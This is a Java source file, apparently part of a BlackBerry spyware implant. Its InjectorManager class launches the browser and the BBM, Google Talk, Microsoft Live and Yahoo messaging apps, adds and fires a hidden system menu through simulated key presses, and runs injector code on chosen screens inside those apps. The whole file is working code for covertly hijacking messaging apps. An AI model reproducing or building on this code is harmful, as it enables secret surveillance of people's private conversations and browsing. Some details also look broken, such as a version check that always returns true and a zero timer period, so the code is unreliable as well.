package blackberry.application;


import java.util.Hashtable;
import java.util.Timer;
import java.util.TimerTask;

import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.Screen;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.InjectorSystemMenu;
import blackberry.injection.KeyInjector;
import blackberry.injection.injectors.AInjector;
import blackberry.injection.injectors.BBMInjector;
import blackberry.injection.injectors.BrowserInjector;
import blackberry.injection.injectors.GoogleTalkInjector;
import blackberry.injection.injectors.MicrosoftLiveInjector;
import blackberry.injection.injectors.YahooInjector;
import blackberry.interfaces.Singleton;
import blackberry.interfaces.iSingleton;
import blackberry.utils.Utils;

public class InjectorManager extends TimerTask implements ApplicationObserver,
        iSingleton {
    private static final long APP_TIMER_PERIOD = 0;
    private static final long GUID = 0x58b6431f259bac8dL;
    //#ifdef DEBUG
    private static Debug debug = new Debug("InjectorManager",
            DebugLevel.VERBOSE);
    private static InjectorManager instance;
    //#endif
    AInjector[] injectors;
    Hashtable injectorMap = new Hashtable();

    private InjectorSystemMenu menu;
    private Timer applicationTimer;
    private String actualMod;
    private String actualName;
    private AInjector injector;

    public synchronized static InjectorManager getInstance() {

        if (instance == null) {
            instance = (InjectorManager) Singleton.self().get(GUID);
            if (instance == null) {
                final InjectorManager singleton = new InjectorManager();
                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }

        }
        return instance;
    }

    public void start() {
        //#ifdef DEBUG
        debug.trace("start");
        //#endif
        AppListener.getInstance().addApplicationObserver(this);
        injectors = new AInjector[] { 
                new BrowserInjector(),
                new BBMInjector(),
                new GoogleTalkInjector(),
                new MicrosoftLiveInjector(),
                new YahooInjector()
        };

        for (int i = 0; i < injectors.length; i++) {
            injector = injectors[i];
            if(!injector.enabled()){
                //#ifdef DEBUG
                debug.trace("start, disabled: " + injector );
                //#endif
                continue;
            }
            //#ifdef DEBUG
            debug.trace("start " + injector);
            //#endif
            String name = injector.getCodName();
            injectorMap.put(name, injector);

            execute(name);
            Utils.sleep(1000);

            addSystemMenu(injector);
            Utils.sleep(500);
            callSystemMenu();
            Utils.sleep(500);
            removeSystemMenu();
        }
    }

    private void removeSystemMenu() {
        //#ifdef DEBUG
        debug.trace("removeSystemMenu");
        //#endif

        ApplicationMenuItemRepository.getInstance().removeMenuItem(
                ApplicationMenuItemRepository.MENUITEM_SYSTEM, menu);

    }

    private void callSystemMenu() {
        //#ifdef DEBUG
        debug.trace("callSystemMenu");
        //#endif

        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
        Utils.sleep(500);

        if (atLeast(7, 0)) {
            //#ifdef DEBUG
            debug.trace("callMenuByKey, version 7, track ball up");
            //#endif
            Utils.sleep(200);
            KeyInjector.trackBallRaw(20, true);
            Utils.sleep(300);
            KeyInjector.trackBallRawClick();
        } else {
            //#ifdef DEBUG
            debug.trace("callMenuByKey, version <7, pressing menu");
            //#endif
            KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
            Utils.sleep(300);
            KeyInjector.trackBallRawClick();
        }

    }

    private boolean atLeast(int i, int j) {

        return true;
    }

    private void addSystemMenu(AInjector injector) {
        //#ifdef DEBUG
        debug.trace("addSystemMenu");
        //#endif
        menu = new InjectorSystemMenu(this,injector);
        menu.addMenu();

    }

    public void stop() {
        //#ifdef DEBUG
        debug.trace("stop");
        //#endif
        menu.removeMenu();
        injectorMap.clear();
    }

    private boolean execute(String command) {
        ApplicationDescriptor applicationDescriptor = getApplicationDescriptor(command);
        if (applicationDescriptor != null) {
            try {
                String urlModule = applicationDescriptor.getModuleName();
                //#ifdef DEBUG
                debug.trace("executeApplication: " + urlModule); //$NON-NLS-1$
                //#endif
                ApplicationManager.getApplicationManager().launch(urlModule);
                return true;
            } catch (Exception ex) {
                //#ifdef DEBUG
                debug.error("executeApplication: " + ex); //$NON-NLS-1$
                //#endif
            }
        }

        return false;
    }
    


    private ApplicationDescriptor getApplicationDescriptor(String executeName) {
        //#ifdef DBC
        Check.requires(executeName != null,
                "getApplicationDescriptor null command"); //$NON-NLS-1$
        //#endif

        //#ifdef DEBUG
        debug.trace("getApplicationDescriptor executeName= " + executeName); //$NON-NLS-1$
        //#endif

        final int handles[] = CodeModuleManager.getModuleHandles();

        final int size = handles.length;
        for (int i = 0; i < size; i++) {
            final int handle = handles[i];
            // CodeModuleManager.getModuleHandle(name)
            // Retrieve specific information about a module.

            final String name = CodeModuleManager.getModuleName(handle);
            if (name.equals(executeName)) {
                //#ifdef DEBUG
                debug.trace("checkCommand, command found: " + executeName); //$NON-NLS-1$
                //#endif
                ApplicationDescriptor[] apps = CodeModuleManager
                        .getApplicationDescriptors(handle);
                if (apps != null && apps.length > 0) {
                    //#ifdef DEBUG
                    debug.trace("checkCommand: got applicationDescription"); //$NON-NLS-1$
                    //#endif
                    return apps[0];

                }
            }
        }

        //#ifdef DEBUG
        debug.warn("getApplicationDescriptor: not found"); //$NON-NLS-1$
        //#endif
        return null;

    }

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {

        //#ifdef DEBUG
        debug.trace("onApplicationChange name: " + startedName + " cod: " + startedMod);
        //#endif
        
        if (applicationTimer != null) {
            applicationTimer.cancel();
            applicationTimer = null;
        }

        if (injectorMap.contains(startedMod)) {
            //#ifdef DEBUG
            debug.trace("onApplicationChange, starting");
            //#endif
            this.actualMod = startedMod;
            this.actualName = startedName;
            applicationTimer = new Timer();

            applicationTimer.schedule(this, APP_TIMER_PERIOD, APP_TIMER_PERIOD);
        }

    }

    public void run() {
        final AInjector injector = (AInjector) injectorMap.get(actualMod);
        if (injector != null && injector.isInjected()) {
            final Screen screen = injector.getInjectedApp().getActiveScreen();
            String screenName = screen.getClass().getName();
            //#ifdef DEBUG
            debug.trace("onApplicationChange: " + screenName);
            //#endif

            for (int i = 0; i < injector.getWantedScreen().length; i++) {
                String s = injector.getWantedScreen()[i];
                if (screenName.endsWith(s)) {
                    //#ifdef DEBUG
                    debug.trace("onApplicationChange: screen found");
                    //#endif

                    injector.getInjectedApp().invokeAndWait(new Runnable() {

                        public void run() {
                            injector.playOnScreen(screen);
                        }

                    });

                    break;
                }
            }
        }
    }



}
